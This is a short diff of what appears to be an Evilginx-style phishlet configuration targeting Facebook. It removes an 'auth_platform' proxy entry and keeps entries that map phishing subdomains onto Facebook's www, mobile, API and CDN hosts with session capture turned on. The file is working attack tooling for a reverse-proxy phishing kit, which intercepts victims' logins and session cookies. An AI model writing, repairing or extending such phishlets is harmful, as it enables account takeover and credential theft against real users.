@@ -3,7 +3,6 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'auth_platform', orig_sub: 'auth_platform', domain: 'facebook.com', session: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: true} 
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 sub_filters:
